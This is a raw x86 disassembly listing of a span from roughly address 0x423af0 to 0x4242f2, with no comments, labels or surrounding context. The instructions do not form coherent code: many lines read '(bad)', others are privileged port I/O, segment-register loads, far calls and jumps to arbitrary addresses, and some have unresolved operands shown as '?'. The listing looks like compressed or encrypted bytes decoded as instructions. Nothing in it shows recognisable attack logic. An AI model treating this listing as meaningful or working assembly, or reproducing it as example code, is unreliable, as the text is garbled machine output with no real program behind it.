  423af0:	pop    ebx
  423af1:	outs   dx,BYTE PTR ds:[esi]
  423af2:	out    dx,al
  423af3:	test   al,0x80
  423af5:	cmp    cl,BYTE PTR [eax+0xc]
  423af8:	js     0x423aad
  423afa:	leave  
  423afb:	cmp    al,0x3e
  423afd:	out    0x80,eax
  423aff:	mov    bl,0x61
  423b01:	pushf  
  423b02:	sub    BYTE PTR [edx],0xd6
  423b05:	(bad)  
  423b06:	cmp    dl,bl
  423b08:	clc    
  423b09:	adc    eax,0x1d860916
  423b0e:	sbb    eax,DWORD PTR ds:0xe1359266
  423b14:	fdivr  DWORD PTR [ecx+0x2a]
  423b17:	in     eax,dx
  423b18:	xchg   DWORD PTR [ebx],ebx
  423b1a:	jge    0x423b81
  423b1c:	mov    eax,ds:0x1764800a
  423b21:	addr16 dec ebp
  423b23:	pop    edx
  423b24:	dec    edx
  423b25:	mov    edi,0x4bf4ca9d
  423b2a:	mov    ebx,es
  423b2c:	inc    esp
  423b2d:	pop    esp
  423b2e:	mov    ds,WORD PTR [ecx-0x29645d28]
  423b34:	cmc    
  423b35:	int3   
  423b36:	int    0xa
  423b38:	outs   dx,DWORD PTR ds:[esi]
  423b39:	mov    cl,ah
  423b3b:	test   DWORD PTR [ebp+0x268269b],0x6b7af731
  423b45:	mov    DWORD PTR [edi+ebx*4-0xf3c7b94],0x45f5f547
  423b50:	out    dx,eax
  423b51:	adc    bh,BYTE PTR [ecx-0x5f66ae67]
  423b57:	repz loop 0x423ae9
  423b5a:	std    
  423b5b:	out    dx,al
  423b5c:	repz fdivr DWORD PTR [edx-0x67]
  423b60:	fldenv [ebx+ecx*4]
  423b63:	push   esp
  423b64:	mov    ch,0x7b
  423b66:	xchg   ebp,eax
  423b67:	inc    ebx
  423b68:	(bad)  [edx+0xf]
  423b6b:	lods   al,BYTE PTR ds:[esi]
  423b6c:	inc    esp
  423b6d:	push   0x42
  423b6f:	xchg   ebx,eax
  423b70:	aaa    
  423b71:	jmp    0x423b50
  423b73:	dec    eax
  423b74:	fcomp  QWORD PTR ds:[esi]
  423b77:	pushf  
  423b78:	dec    eax
  423b79:	mov    esp,0x55fca8ba
  423b7e:	std    
  423b7f:	push   0x7fcbd1d2
  423b84:	mov    esi,DWORD PTR [esi+0x7e]
  423b87:	and    al,0xa5
  423b89:	in     al,dx
  423b8a:	int    0xa5
  423b8c:	aaa    
  423b8d:	or     DWORD PTR [eax],ebp
  423b8f:	stos   BYTE PTR es:[edi],al
  423b90:	inc    ecx
  423b91:	cwde   
  423b92:	jb     0x423bb1
  423b94:	add    bl,BYTE PTR [edx+0x6f]
  423b97:	mov    ?,ecx
  423b99:	mov    cs,WORD PTR [esi+0x69]
  423b9c:	fwait
  423b9d:	mov    esi,0xafd2a73e
  423ba2:	into   
  423ba3:	xchg   BYTE PTR [esi+0x4b],cl
  423ba6:	xchg   ecx,eax
  423ba7:	jae    0x423b6a
  423ba9:	cs push ebx
  423bab:	xor    DWORD PTR [edx+ecx*4+0x72],0xffffffa7
  423bb0:	sbb    al,0x3f
  423bb2:	jle    0x423b70
  423bb4:	cmp    eax,0xaaa6b327
  423bb9:	jl     0x423bdb
  423bbb:	popa   
  423bbc:	daa    
  423bbd:	lds    esi,FWORD PTR [eax-0x23]
  423bc0:	push   cs
  423bc1:	and    DWORD PTR [ebx],edi
  423bc3:	xor    al,BYTE PTR [eax+0x5f2fba95]
  423bc9:	dec    ebp
  423bca:	data16 cmp ch,BYTE PTR [di]
  423bce:	stos   BYTE PTR es:[edi],al
  423bcf:	push   ecx
  423bd0:	mov    es,WORD PTR [esi+0x5e51fe14]
  423bd6:	loopne 0x423b69
  423bd8:	bound  esi,QWORD PTR [edi]
  423bda:	add    BYTE PTR [edi+0x50],ah
  423bdd:	push   es
  423bde:	dec    esi
  423bdf:	jmp    0x423b75
  423be1:	xchg   ebp,eax
  423be2:	pusha  
  423be3:	jmp    0x1f0782f1
  423be8:	cmp    eax,0xc2a66336
  423bed:	mov    DWORD PTR [esi+esi*8],ebp
  423bf0:	pop    edi
  423bf1:	ds jl  0x423b84
  423bf4:	fnstcw WORD PTR [edi-0x7b]
  423bf7:	xchg   edi,eax
  423bf8:	cmp    ebx,esp
  423bfa:	and    dh,BYTE PTR [ebx*1-0x725d0b05]
  423c01:	rcl    DWORD PTR [esi+edi*1+0x35],1
  423c05:	sti    
  423c06:	xchg   edi,eax
  423c07:	pop    edi
  423c08:	mov    WORD PTR [ebx+0x1348f823],ds
  423c0e:	cmp    BYTE PTR [ebx-0x3],cl
  423c11:	mov    WORD PTR [edx+0x41],fs
  423c14:	sbb    ebx,DWORD PTR [edi-0x47]
  423c17:	cdq    
  423c18:	aas    
  423c19:	adc    DWORD PTR [ecx-0x60],esi
  423c1c:	sbb    al,0xf3
  423c1e:	push   es
  423c1f:	out    0x67,eax
  423c21:	cwde   
  423c22:	out    0x3f,eax
  423c24:	mov    esp,0x8e8f33eb
  423c29:	bound  ebp,QWORD PTR [ebx+eiz*1]
  423c2c:	imul   eax,ebp,0xffffff99
  423c2f:	xchg   ecx,eax
  423c30:	add    eax,0xd12a177f
  423c35:	fs mov bl,0xa3
  423c38:	(bad)  
  423c3a:	ds dec esi
  423c3c:	adc    cl,0xf9
  423c3f:	shr    BYTE PTR [ebp-0x63492968],0x82
  423c46:	xlat   BYTE PTR ds:[ebx]
  423c47:	dec    esi
  423c48:	shr    ch,0xf1
  423c4b:	hlt    
  423c4c:	(bad)  
  423c4d:	add    ah,al
  423c4f:	pop    ecx
  423c50:	mov    cl,0xa
  423c52:	jmp    DWORD PTR ds:0x5d2f9acc
  423c58:	or     BYTE PTR [eax-0x49387fd0],0xc8
  423c5f:	or     edx,0x62a2b33f
  423c65:	jo     0x423cde
  423c67:	inc    eax
  423c68:	pop    DWORD PTR [esi-0x2449f9f3]
  423c6e:	aaa    
  423c6f:	loopne 0x423cb0
  423c71:	mov    ah,0x8b
  423c73:	arpl   cx,dx
  423c75:	imul   ebp,DWORD PTR [edx],0x9f057bc8
  423c7b:	xchg   ebx,eax
  423c7c:	jno    0x423ce6
  423c7e:	cmp    dl,BYTE PTR [edx+0x71]
  423c81:	mov    edi,0xa9de6fae
  423c86:	je     0x423cb2
  423c88:	shrd   DWORD PTR [esi-0x216707c8],esi,0x63
  423c90:	sbb    al,0x2b
  423c92:	sbb    DWORD PTR [ecx+0x7f],ecx
  423c95:	je     0x423c23
  423c97:	pusha  
  423c98:	rol    ebx,0x7
  423c9b:	jge    0x423c55
  423c9d:	xchg   edx,eax
  423c9e:	cmp    eax,DWORD PTR ds:0xede729b
  423ca4:	cmp    al,0x65
  423ca6:	jns    0x423c83
  423ca8:	sbb    eax,0xd12e3230
  423cad:	das    
  423cae:	xchg   edi,eax
  423caf:	imul   BYTE PTR [ecx+edx*8-0x7bb5598b]
  423cb6:	dec    edx
  423cb7:	mov    ah,0xe6
  423cb9:	jge    0x423caa
  423cbb:	popf   
  423cbc:	adc    al,0x37
  423cbe:	arpl   WORD PTR [ecx],di
  423cc0:	call   0x73e7:0xa392c670
  423cc7:	(bad)  
  423cc8:	fidivr DWORD PTR [eax-0x73]
  423ccb:	jp     0x423d2e
  423ccd:	cdq    
  423cce:	in     al,dx
  423ccf:	pop    esi
  423cd0:	std    
  423cd1:	fwait
  423cd2:	inc    edi
  423cd3:	lds    edi,FWORD PTR [edi+edi*4+0x3a]
  423cd7:	pop    esi
  423cd8:	lock stos BYTE PTR es:[edi],al
  423cda:	gs enter 0x888b,0xaf
  423cdf:	sub    cl,BYTE PTR [edi]
  423ce1:	fild   WORD PTR [ebp+0x39]
  423ce4:	adc    BYTE PTR [edx+esi*1+0x7a],dl
  423ce8:	and    dl,BYTE PTR [edx]
  423cea:	int    0x4e
  423cec:	stc    
  423ced:	inc    ebp
  423cee:	(bad)  
  423cf0:	fdivr  st,st(7)
  423cf2:	cld    
  423cf3:	fst    QWORD PTR cs:[ebp-0x3e]
  423cf7:	fist   DWORD PTR [ebx]
  423cf9:	push   cs
  423cfa:	lods   al,BYTE PTR ds:[esi]
  423cfb:	lea    edi,[edi]
  423cfd:	mov    esp,0x7bb4cb3a
  423d02:	inc    edx
  423d03:	dec    ebx
  423d04:	dec    edx
  423d05:	xchg   BYTE PTR [ebp-0x44685765],cl
  423d0b:	scas   eax,DWORD PTR es:[edi]
  423d0c:	pop    ss
  423d0d:	jns    0x423d23
  423d0f:	and    DWORD PTR [ebp+0x18b91f9b],eax
  423d15:	xchg   edx,ebp
  423d17:	fcomp  QWORD PTR ds:0x713cb484
  423d1d:	mov    ebp,0xc8d61e05
  423d22:	imul   ebp,DWORD PTR [esi+0x441c3ceb],0xffffffc9
  423d29:	ror    DWORD PTR [edx+0x38],0x8e
  423d2d:	sub    DWORD PTR [ecx+0x7a858016],esp
  423d33:	sahf   
  423d34:	mov    edi,cs
  423d36:	dec    esp
  423d37:	(bad)  
  423d38:	dec    esi
  423d39:	push   ss
  423d3a:	in     al,dx
  423d3b:	jae    0x423d0e
  423d3d:	mov    bh,0xfc
  423d3f:	mov    esi,0x68ca197d
  423d44:	inc    ebp
  423d45:	adc    BYTE PTR [ebp+0x3352b4b8],dh
  423d4b:	repnz sbb ch,bh
  423d4e:	or     ebp,DWORD PTR ds:0x3efacbaf
  423d54:	push   ss
  423d55:	pop    edx
  423d56:	jge    0x423dcb
  423d58:	cmc    
  423d59:	in     al,0x6c
  423d5b:	mov    bh,0x28
  423d5d:	jmp    0x8e2b:0xa3463693
  423d64:	push   edi
  423d65:	push   es
  423d66:	ret    
  423d67:	jg     0x423d81
  423d69:	shl    edx,1
  423d6b:	sbb    DWORD PTR [esi-0x40683baf],esi
  423d71:	and    ebp,eax
  423d73:	cdq    
  423d74:	(bad)  
  423d75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423d76:	pop    ds
  423d77:	test   BYTE PTR [ebx-0x6a327afd],bl
  423d7d:	jb     0x423d71
  423d7f:	mov    bl,0x8e
  423d81:	jns    0x423da3
  423d83:	mov    DWORD PTR [ecx-0x485039cb],esi
  423d89:	mov    esi,0x61844874
  423d8e:	xor    BYTE PTR [ebp+0x58],cl
  423d91:	inc    eax
  423d92:	xchg   ebp,eax
  423d93:	mov    ebx,0x433b8247
  423d98:	adc    DWORD PTR fs:[edx-0x54],esp
  423d9c:	dec    ecx
  423d9d:	cmp    esi,DWORD PTR [eax-0x361e9c69]
  423da3:	in     al,0xa9
  423da5:	js     0x423d5d
  423da7:	add    al,0xe7
  423da9:	std    
  423daa:	mov    eax,ds:0xe2da66c9
  423daf:	cmp    al,0xa0
  423db1:	adc    BYTE PTR [ecx],0xd7
  423db4:	(bad)  
  423db5:	pushf  
  423db6:	sbb    DWORD PTR [eax+0xee6dbf5],eax
  423dbc:	pop    ds
  423dbd:	dec    ecx
  423dbe:	pop    edi
  423dbf:	xor    eax,0x926169b8
  423dc4:	or     BYTE PTR [ecx-0x7c8d30a],0x5c
  423dcb:	adc    al,0x7f
  423dcd:	fisubr DWORD PTR [ecx-0x3d]
  423dd0:	mov    BYTE PTR [ecx+0x4198910],al
  423dd6:	aad    0x49
  423dd8:	xchg   esp,eax
  423dd9:	shr    ch,cl
  423ddb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423ddc:	fsub   QWORD PTR [edx]
  423dde:	scas   al,BYTE PTR es:[edi]
  423ddf:	xor    al,BYTE PTR [ebp-0x6c]
  423de2:	jno    0x423d97
  423de4:	and    dl,BYTE PTR [eax-0x5c5b474e]
  423dea:	mov    dh,0xc
  423dec:	inc    eax
  423ded:	jns    0x423de9
  423def:	es push ds
  423df1:	daa    
  423df2:	fwait
  423df3:	mov    esp,?
  423df5:	push   0xd46d5b74
  423dfa:	sbb    ch,BYTE PTR [esi-0x1045e886]
  423e00:	xor    BYTE PTR [edi],bl
  423e02:	xchg   esp,eax
  423e03:	test   cl,0xeb
  423e06:	(bad)  
  423e07:	sbb    al,0x81
  423e09:	outs   dx,BYTE PTR ds:[esi]
  423e0a:	mov    BYTE PTR [ecx+0x2701c33a],bl
  423e10:	cwde   
  423e11:	or     ah,bh
  423e13:	add    ecx,DWORD PTR [edx-0x168bc346]
  423e19:	jno    0x423d9b
  423e1b:	and    BYTE PTR [edi+0x52acab8b],ah
  423e21:	enter  0xa875,0xdc
  423e25:	sub    DWORD PTR [esi-0x22a9cc76],ecx
  423e2b:	mov    BYTE PTR [ecx+0x21],bh
  423e2e:	icebp  
  423e2f:	sbb    eax,0xe2d761b3
  423e34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423e35:	aaa    
  423e36:	sbb    bl,BYTE PTR [edi+0x3c2cf02e]
  423e3c:	or     dh,bl
  423e3e:	aam    0xf
  423e40:	dec    ecx
  423e41:	sub    BYTE PTR [edx+0x4cc9248a],0xca
  423e48:	sub    eax,0xe0e7d7b2
  423e4d:	mov    esp,0x7c915e37
  423e52:	pop    ebx
  423e53:	xor    BYTE PTR [ebp+0x214a0270],cl
  423e59:	jbe    0x423ded
  423e5b:	iret   
  423e5c:	mov    dh,0xa4
  423e5e:	sbb    eax,0xd7c26e17
  423e63:	out    dx,eax
  423e64:	sti    
  423e65:	test   eax,0xe33d7883
  423e6a:	call   0x962accca
  423e6f:	adc    al,0x51
  423e71:	(bad)  
  423e72:	dec    ebx
  423e73:	xchg   ecx,eax
  423e74:	push   edx
  423e75:	sbb    bl,BYTE PTR [eax]
  423e77:	cmp    BYTE PTR [edx+0x1943945e],dh
  423e7d:	(bad)
  423e80:	xor    BYTE PTR [ebp+ebx*8-0x5f],al
  423e84:	mov    bl,0xa0
  423e86:	add    ebx,0x15
  423e89:	push   edi
  423e8a:	loope  0x423e85
  423e8c:	fst    DWORD PTR [ecx-0x6f]
  423e8f:	arpl   WORD PTR es:[ecx+0x2612741a],sp
  423e96:	mov    dl,0x50
  423e98:	adc    ebp,0x27
  423e9b:	aad    0xeb
  423e9d:	test   DWORD PTR [ebx+0x7d958bf0],ecx
  423ea3:	call   0x72c8362e
  423ea8:	test   eax,0x341f3a05
  423ead:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423eae:	in     eax,0x88
  423eb0:	mov    eax,0x5fb5c6cb
  423eb5:	inc    edi
  423eb6:	(bad)  
  423eb8:	retf   0xc64f
  423ebb:	lock sub DWORD PTR [eax+0x5fc592ed],eax
  423ec2:	je     0x423ec7
  423ec4:	out    dx,eax
  423ec5:	mov    esp,DWORD PTR [eax-0x7324ab4f]
  423ecb:	out    dx,eax
  423ecc:	dec    ecx
  423ecd:	test   DWORD PTR [ebx+0x2fcf360a],0xde3ab612
  423ed7:	sub    BYTE PTR [edx-0x2f118873],bh
  423edd:	inc    esi
  423ede:	ins    DWORD PTR es:[edi],dx
  423edf:	xchg   edx,eax
  423ee0:	cmp    ah,bl
  423ee2:	shl    DWORD PTR [ecx-0x51],1
  423ee5:	push   0x3e
  423ee7:	jmp    0xb12e442b
  423eec:	adc    al,0x2d
  423eee:	shl    DWORD PTR [edi-0x26],1
  423ef1:	adc    eax,0xb10d4fac
  423ef6:	(bad)  
  423ef8:	loopne 0x423f1c
  423efa:	jle    0x423ec5
  423efc:	sub    dl,dl
  423efe:	out    dx,al
  423eff:	popa   
  423f00:	hlt    
  423f01:	push   cs
  423f02:	fcmovnu st,st(2)
  423f04:	or     eax,0x76ab5715
  423f09:	jbe    0x423ef4
  423f0b:	std    
  423f0c:	in     al,dx
  423f0d:	push   ss
  423f0e:	adc    DWORD PTR [ecx+eiz*2-0x28],ecx
  423f12:	pop    esp
  423f13:	std    
  423f14:	adc    ecx,DWORD PTR ds:0xa91f7ffd
  423f1a:	mov    al,BYTE PTR [edi-0x1b]
  423f1d:	xchg   esp,eax
  423f1e:	fdivr  st,st(3)
  423f20:	es fndisi(8087 only) 
  423f23:	or     al,0x65
  423f25:	inc    DWORD PTR [ebp+0x2b241fff]
  423f2b:	sbb    dl,BYTE PTR [edi+0x7e]
  423f2e:	jp     0x423f09
  423f30:	das    
  423f31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423f32:	inc    ecx
  423f33:	out    dx,al
  423f34:	call   0x9822:0x90375b5e
  423f3b:	fstp   QWORD PTR [esi]
  423f3d:	lods   al,BYTE PTR ds:[esi]
  423f3e:	and    eax,0x8a72d7f7
  423f43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423f44:	lock dec edi
  423f46:	fcom   QWORD PTR ds:0xb766e1f4
  423f4c:	push   edx
  423f4d:	add    DWORD PTR [eax],esp
  423f4f:	mov    ebp,ss
  423f51:	ds stos DWORD PTR es:[edi],eax
  423f53:	fist   WORD PTR [edx+edx*4]
  423f56:	jo     0x423fce
  423f58:	sbb    al,0xd0
  423f5a:	add    al,0xc6
  423f5c:	dec    ebp
  423f5d:	cmp    al,0x5a
  423f5f:	rcr    BYTE PTR [ebp+0x43],0xd3
  423f63:	and    BYTE PTR [ecx],bh
  423f65:	inc    edx
  423f66:	fbstp  TBYTE PTR [esi+edi*2-0x1d]
  423f6a:	jge    0x423eec
  423f6c:	out    dx,eax
  423f6d:	pushf  
  423f6e:	cmp    bl,cl
  423f70:	cdq    
  423f71:	mov    ebp,0xe9a5ad1
  423f76:	cmp    dh,BYTE PTR [ecx+0x9]
  423f79:	push   ecx
  423f7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423f7b:	outs   dx,DWORD PTR ds:[esi]
  423f7c:	je     0x423f09
  423f7e:	cld    
  423f7f:	fisubr DWORD PTR [esi+0x42]
  423f82:	fidiv  DWORD PTR [ebx+0x71a629ca]
  423f88:	test   DWORD PTR [edi+0x3],edi
  423f8b:	inc    edi
  423f8c:	lidtd  [ebp-0x49]
  423f90:	mov    al,ds:0xf818b8c0
  423f95:	outs   dx,BYTE PTR ds:[esi]
  423f96:	mov    esp,0x17c2d314
  423f9b:	iret   
  423f9c:	adc    eax,0x49b254e3
  423fa1:	pop    es
  423fa2:	jmp    0x423f80
  423fa4:	xchg   eax,ebx
  423fa6:	xor    BYTE PTR [eax+0xb],0xf0
  423faa:	call   0x7651:0x2b4319cc
  423fb1:	add    al,0x4a
  423fb3:	push   edi
  423fb4:	cs push ebp
  423fb6:	popf   
  423fb7:	(bad)  
  423fb8:	nop
  423fb9:	mov    ah,0x7c
  423fbb:	inc    eax
  423fbc:	mov    ebx,0x826a642b
  423fc1:	add    ebp,DWORD PTR [eax]
  423fc3:	sbb    eax,0x135866d2
  423fc8:	pop    eax
  423fc9:	add    al,0x20
  423fcb:	jg     0x423fde
  423fcd:	inc    ebx
  423fce:	mov    al,BYTE PTR [eax+0x1747d54]
  423fd4:	mov    ah,0x60
  423fd6:	push   esp
  423fd7:	push   es
  423fd8:	add    eax,0xafd725ad
  423fdd:	iret   
  423fde:	imul   edi,DWORD PTR [ebp-0xc],0xffffffa2
  423fe2:	adc    edx,DWORD PTR [edi-0x34]
  423fe5:	(bad)  
  423fe6:	push   esp
  423fe7:	pop    eax
  423fe8:	mov    dh,0x54
  423fea:	xchg   ecx,eax
  423feb:	mov    edi,0x89572391
  423ff0:	lods   al,BYTE PTR ds:[esi]
  423ff1:	outs   dx,DWORD PTR ds:[esi]
  423ff2:	pop    ecx
  423ff3:	pop    edi
  423ff4:	mov    bh,0x6
  423ff6:	jo     0x423ff7
  423ff8:	pusha  
  423ff9:	mov    esi,0x5ab68ec2
  423ffe:	cmp    ebx,DWORD PTR [edx+0x56]
  424001:	imul   edx,DWORD PTR [edi-0x5c61e354],0x1fe026c9
  42400b:	push   ss
  42400c:	xchg   BYTE PTR [ebx+0x4e3d13a],bl
  424012:	adc    bl,BYTE PTR [ebx+0x5b]
  424015:	imul   edi,esp,0x10a4ac50
  42401b:	and    eax,0x323753f7
  424020:	jno    0x423fb3
  424022:	mov    al,0xac
  424024:	mov    edx,0x9ed440bc
  424029:	add    DWORD PTR ds:0x7a13aaaf,edi
  42402f:	and    al,0x43
  424031:	mov    esp,0x9717629a
  424036:	adc    WORD PTR [eax+ebx*4+0x5d],bp
  42403b:	mov    al,ds:0x72eb1220
  424040:	xchg   ecx,eax
  424041:	adc    BYTE PTR [ebx],0x72
  424044:	es mov edx,0xaaecd8d4
  42404a:	sar    BYTE PTR [ecx],0xc4
  42404d:	fwait
  42404e:	out    0x2,eax
  424050:	std    
  424051:	mov    ds:0x38ee971c,eax
  424056:	call   0xa49:0xf0007ea
  42405d:	pop    ss
  42405e:	fimul  DWORD PTR [ebx+ebx*4+0x4280821d]
  424065:	pop    ss
  424066:	adc    BYTE PTR [edx+esi*2-0x671414aa],0xa6
  42406e:	arpl   bp,bp
  424070:	sub    eax,0x87a90f82
  424075:	xor    eax,0xcee65f05
  42407a:	adc    eax,0x6d0c094
  42407f:	pop    esp
  424080:	xor    ebp,DWORD PTR [edi-0x32]
  424083:	cwde   
  424084:	cdq    
  424085:	sub    DWORD PTR [ebx+0x53],edx
  424088:	lods   al,BYTE PTR ds:[esi]
  424089:	jne    0x4240dd
  42408b:	cmc    
  42408c:	(bad)  
  42408d:	into   
  42408e:	loope  0x424046
  424090:	cld    
  424091:	mov    ch,ch
  424093:	dec    eax
  424094:	lock cmc 
  424096:	ret    0x75e9
  424099:	cwde   
  42409a:	xor    bl,BYTE PTR [ebx]
  42409c:	popf   
  42409d:	cmp    bh,BYTE PTR [edx-0x20]
  4240a0:	or     al,0x9d
  4240a2:	lea    edx,[esi]
  4240a4:	in     eax,0xce
  4240a6:	inc    esi
  4240a7:	arpl   WORD PTR es:[ebp*2-0x58c82ded],bx
  4240af:	jl     0x424083
  4240b1:	shl    DWORD PTR [eax],0x5e
  4240b4:	js     0x42405d
  4240b6:	mov    esp,0xd8582
  4240bb:	jns    0x424041
  4240bd:	(bad)  
  4240c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4240c1:	adc    eax,0x16149726
  4240c6:	inc    ecx
  4240c7:	jle    0x4240c9
  4240c9:	mov    esi,0x333cb1ca
  4240ce:	lods   al,BYTE PTR ds:[esi]
  4240cf:	push   0xffffffb7
  4240d1:	mov    ebx,0xe6594801
  4240d6:	adc    dh,BYTE PTR [ecx-0xf]
  4240d9:	and    ch,bl
  4240db:	jne    0x4240f2
  4240dd:	in     al,dx
  4240de:	sbb    al,0x23
  4240e0:	jmp    0x42413c
  4240e2:	sbb    eax,esp
  4240e4:	dec    esp
  4240e5:	cs pushf 
  4240e7:	sub    esp,edx
  4240e9:	and    esi,esp
  4240eb:	lods   eax,DWORD PTR ds:[esi]
  4240ec:	cmc    
  4240ed:	shl    DWORD PTR [edi+0x234dfd3b],0x3b
  4240f4:	lods   eax,DWORD PTR fs:[esi]
  4240f6:	popa   
  4240f7:	mov    eax,ds:0xeb9d0f8a
  4240fc:	push   esi
  4240fd:	stc    
  4240fe:	or     DWORD PTR [ebp+0xd],esi
  424101:	(bad)  
  424102:	out    0x15,eax
  424104:	cs in  al,0xfb
  424107:	mov    ch,BYTE PTR [ebx-0x36]
  42410a:	push   eax
  42410b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42410c:	push   ecx
  42410d:	dec    ecx
  42410e:	adc    DWORD PTR [edi+0x5],ebp
  424111:	sahf   
  424112:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424113:	inc    esp
  424114:	cli    
  424115:	ja     0x4240ac
  424117:	in     al,dx
  424118:	daa    
  424119:	(bad)  
  42411a:	fnstsw WORD PTR [edi-0x50]
  42411d:	mov    ch,0x3f
  42411f:	push   edi
  424120:	int    0x7b
  424122:	mov    esp,0xf2a00d1d
  424127:	mov    dh,0x20
  424129:	inc    ebp
  42412a:	mov    ebp,0x238b21d8
  42412f:	imul   esp,eax,0xf63297c1
  424135:	enter  0x2a9d,0xad
  424139:	or     BYTE PTR [eax+0x28],dl
  42413c:	sbb    BYTE PTR [edx-0x6db6bb9c],dl
  424142:	add    esp,DWORD PTR [eax-0x66542eb6]
  424148:	jmp    0x94c3:0x818bae00
  42414f:	pop    edx
  424150:	fwait
  424151:	das    
  424152:	js     0x42417b
  424154:	dec    esi
  424155:	mov    edi,0x9ce40d2c
  42415a:	arpl   WORD PTR [esi-0x111f331f],ax
  424160:	mov    BYTE PTR ds:0xf74b79d3,ah
  424166:	adc    BYTE PTR [ebx],0x5
  424169:	sub    eax,0x59fb4f18
  42416e:	and    al,0x34
  424170:	addr16 out 0xeb,eax
  424173:	mov    ebp,0x15dcb1d2
  424178:	and    DWORD PTR [ebx],ecx
  42417a:	sbb    eax,0x90f5f7ab
  42417f:	cmp    bh,ch
  424181:	nop
  424182:	pop    ss
  424183:	iret   
  424184:	mov    ecx,0xf06f34c1
  424189:	and    eax,0xb4fd430c
  42418e:	loopne 0x42420f
  424190:	mov    ds:0x23d101db,eax
  424195:	mov    ?,WORD PTR [edx+0x2d67fe57]
  42419b:	mov    dl,0xf
  42419d:	aam    0xd3
  42419f:	out    dx,eax
  4241a0:	xchg   edi,eax
  4241a1:	mov    fs,WORD PTR [esi-0x1e3afe76]
  4241a7:	jmp    0xcdc9c235
  4241ac:	mov    eax,ds:0x626658f8
  4241b1:	js     0x4241d0
  4241b3:	ror    bh,cl
  4241b5:	jge    0x42415e
  4241b7:	dec    eax
  4241b8:	cdq    
  4241b9:	push   es
  4241ba:	xchg   ecx,eax
  4241bb:	popf   
  4241bc:	lods   eax,DWORD PTR ds:[esi]
  4241bd:	mov    al,0x2d
  4241bf:	mov    ebx,0xe5a887c2
  4241c4:	stc    
  4241c5:	nop
  4241c6:	rol    DWORD PTR ds:0x52dcc4f0,1
  4241cc:	jl     0x424193
  4241ce:	loopne 0x4241d0
  4241d0:	inc    ecx
  4241d1:	cld    
  4241d2:	inc    edi
  4241d3:	in     al,0xd8
  4241d5:	jns    0x424197
  4241d7:	xor    BYTE PTR [esi+0x28],0x8e
  4241db:	cmp    eax,0x42ae6a83
  4241e0:	daa    
  4241e1:	js     0x424228
  4241e3:	out    0x1f,eax
  4241e5:	mov    ds:0x56bd7dc5,al
  4241ea:	cmp    dl,dl
  4241ec:	xchg   edx,eax
  4241ed:	iret   
  4241ee:	adc    al,0x9c
  4241f0:	(bad)  
  4241f1:	mov    bh,0x86
  4241f3:	popa   
  4241f4:	sub    eax,0x7aae3307
  4241f9:	loopne 0x4241d4
  4241fb:	inc    ebx
  4241fc:	test   DWORD PTR ds:0xcf522beb,ecx
  424202:	cmp    al,0x47
  424204:	jp     0x424231
  424206:	add    al,0x35
  424208:	imul   ecx,DWORD PTR [ebx],0x45c846e6
  42420e:	lahf   
  42420f:	sub    al,0x9e
  424211:	xor    DWORD PTR [edx],edx
  424213:	(bad)  
  424214:	int    0x32
  424216:	cdq    
  424217:	xor    BYTE PTR [edx+eax*4],0xa0
  42421b:	pusha  
  42421c:	jg     0x42424a
  42421e:	xchg   esi,eax
  42421f:	ror    edx,cl
  424221:	mov    eax,0x3d74a165
  424226:	leave  
  424227:	in     eax,dx
  424228:	pop    ebp
  424229:	mov    ch,0x14
  42422b:	int    0xd7
  42422d:	test   DWORD PTR [eax+0x78],ecx
  424230:	rol    BYTE PTR [edi+0x36],0x5e
  424234:	and    BYTE PTR [ebx-0x7918f87a],dh
  42423a:	xor    esp,DWORD PTR [ebp+0x7a4b74fc]
  424240:	call   0xffc7d4c7
  424245:	mov    bh,BYTE PTR [ecx-0x73]
  424248:	out    dx,al
  424249:	inc    esp
  42424a:	sbb    al,0xea
  42424c:	sbb    eax,0xf2db8c43
  424251:	sahf   
  424252:	add    ebp,DWORD PTR [edi]
  424254:	pop    ebp
  424255:	jbe    0x424233
  424257:	push   edx
  424258:	test   eax,0x35a19532
  42425d:	push   es
  42425e:	adc    al,0x20
  424260:	in     al,0x3d
  424262:	xor    eax,0xdda5ca39
  424267:	xchg   edx,eax
  424268:	jmp    0x42428d
  42426a:	sub    eax,0xa2c320e0
  42426f:	call   0x5b1f:0xc655a2b9
  424276:	add    bl,BYTE PTR [edi+0x5fec61b5]
  42427c:	mov    dh,0x63
  42427e:	daa    
  42427f:	xor    BYTE PTR [edi+0x5e],al
  424282:	and    esi,edi
  424284:	loope  0x42429c
  424286:	call   0x28b26024
  42428b:	ds in  eax,dx
  42428d:	(bad)  
  42428e:	mov    al,0xf9
  424290:	xor    bp,WORD PTR [ecx-0x356651dc]
  424297:	arpl   sp,si
  424299:	shl    BYTE PTR [eax+edx*1+0x23],0x84
  42429e:	(bad)  
  42429f:	mov    cs,WORD PTR ds:0xeb86a134
  4242a5:	jno    0x4242a9
  4242a7:	fptan  
  4242a9:	dec    edi
  4242aa:	in     eax,dx
  4242ab:	(bad)  
  4242ad:	(bad)  
  4242ae:	push   esp
  4242af:	sub    eax,0xb6a9f686
  4242b4:	mov    ecx,0x431fb08
  4242b9:	fnstenv [esi-0x3a]
  4242bc:	cmp    BYTE PTR [ebx+ebx*4],bl
  4242bf:	push   es
  4242c0:	dec    esi
  4242c1:	dec    ecx
  4242c2:	neg    DWORD PTR [edi+edx*2]
  4242c5:	add    eax,0x7dbc3ab6
  4242ca:	(bad)  
  4242cb:	fld    DWORD PTR [edi]
  4242cd:	mov    ?,WORD PTR [ebx-0x7e]
  4242d0:	jnp    0x4242ba
  4242d2:	xchg   ebp,eax
  4242d3:	pop    esi
  4242d4:	enter  0xae1,0x54
  4242d8:	out    dx,al
  4242d9:	add    al,bl
  4242db:	dec    ecx
  4242dc:	fcom   DWORD PTR [edi]
  4242de:	hlt    
  4242df:	out    dx,eax
  4242e0:	daa    
  4242e1:	loop   0x4242a8
  4242e3:	les    eax,FWORD PTR [ebp-0x111ef13b]
  4242e9:	je     0x424273
  4242eb:	pop    ebx
  4242ec:	mov    bh,BYTE PTR [esi-0x21f9e950]
  4242f2:	sbb    bl,dl
